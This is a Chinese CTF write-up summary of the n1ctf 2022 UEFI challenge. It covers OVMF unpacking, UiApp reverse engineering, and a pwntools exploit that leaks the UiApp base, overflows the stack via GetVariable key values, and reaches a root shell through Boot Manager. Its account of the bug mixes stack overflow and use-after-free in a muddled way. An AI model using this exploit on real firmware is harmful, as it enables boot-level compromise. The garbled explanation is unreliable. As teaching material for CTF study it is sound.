---
title: 原创Paper | 从一道题入门 UEFI PWN
contest: n1ctf 2022 UEFI
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [UEFI, OVMF, uefi-firmware-parser, UiApp, gRT, GetVariable, Double GetVariable, 栈溢出, BIOS劫持, qemu]
attack_chain:
  - OVMF.fd 解包: uefi-firmware-parser -ecO ./OVMF.fd
  - 定位 UiApp: volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0
  - 找关键函数: file-462caa21-.../section0.pe
  - IDA 反编译 UiApp, 还原 gRT 结构体
  - gRT->SetVariable/GetVariable 键值对操作
  - 漏洞: Double GetVariable 栈溢出
  - qemu 启动 OVMF.fd + -s -S + gdb attach
  - 内存搜索 UiApp 加载基址
  - boot_offset=0x235A, uiapp_offset=0x1e009c0
  - 泄露 UiApp 基址: 256 字节 leak + Encode 算偏移
  - 栈溢出 payload = 'a'*0x18 + p32(boot_addr)
  - add("N1CTF_KEY1", payload) + add("N1CTF_KEY2", payload)
  - 劫持控制流到 Boot Manager → root shell
key_payload: 'Double GetVariable 栈溢出 + boot_offset=0x235A + p32(boot_addr) ret 劫持'
one_liner: UEFI PWN 入门：OVMF 解包 + UiApp 反编译 + Double GetVariable 栈溢出 + qemu gdb 动态调试 + 劫持 Boot Manager 拿 root。
lesson: UEFI 漏洞核心在 gRT (Runtime Services) SetVariable/GetVariable; Double GetVariable 是经典模式 (GetVariable 两次读到同一内存区域, 中间内存重分配造成 UAF/溢出); 加载基址靠内存指令序列搜索定位。
quality: high
---

# 原创Paper | 从一道题入门 UEFI PWN

## 概览
- **来源**: ctfiot 72677
- **赛事**: n1ctf 2022 UEFI 题
- **难度**: ⭐⭐⭐⭐

## 题目分析
- OVMF.fd (UEFI 固件) + UiApp 二进制
- 用 `uefi-firmware-parser -ecO ./OVMF.fd` 解包
- UiApp 位于 `volume-0/file-9e21fd93-9c72-4c15-8c4b-e77f1db2d792/section0`
- 关键二进制: `file-462caa21-7614-4503-836e-8ab6f4662331/section0.pe`

## 漏洞
- gRT (Global Runtime Services) 结构体:
  - gRT->SetVariable 写键值对到栈
  - gRT->GetVariable 从键值对读回
- **Double GetVariable** UAF: 第一次 GetVariable 读出栈 → 第二次 GetVariable 触发重分配 → 旧栈指针悬垂
- 后续覆盖栈内容 → 控制流劫持

## 动态调试
```bash
qemu-system-x86_64 -m 256 -drive if=pflash,format=raw,file=OVMF.fd \
  -drive file=fat:rw:contents,format=raw -net none -monitor /dev/null \
  -s -S -nographic
```
- gdb attach, 0xfff0 BIOS 基址
- 搜索 UiApp 内存特征指令 → uiapp_offset=0x1e009c0

## 利用
```python
# 1. 泄露 UiApp 基址
p.sendline("\x1b[24~"*10)  # F12 进 BIOS
p.sendlineafter("> ", "1")  # Add
p.sendlineafter("Key name:", "N1CTF_KEY3")
p.sendafter("Key value:", "a"*256)
# Encode 后 recv 解析泄露地址
uiapp_base = leak_addr - uiapp_offset
boot_addr = uiapp_base + boot_offset  # 0x235A

# 2. 栈溢出
payload = 'a'*0x18 + p32(boot_addr)
add("N1CTF_KEY1", payload)
add("N1CTF_KEY2", payload)
add("OVERFLOW", 'a'*0x11)

# 3. Boot Manager 拿 root
p.sendline('4')
p.recvuntil("Standard PC")
send_key("down", 3)
send_key("enter")  # 各种 menu 导航
...
p.send(b"\rrootshell\r")
p.send(b"console=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r")
p.interactive()
```

## 教学
- UEFI = Unified Extensible Firmware Interface, BIOS 替代
- gRT 全局运行时服务, SetVariable/GetVariable 是固件持久化接口
- Double GetVariable 经典 UAF: 多次读取同一键触发重分配
- 动态调试: qemu -s -S + gdb remote :1234
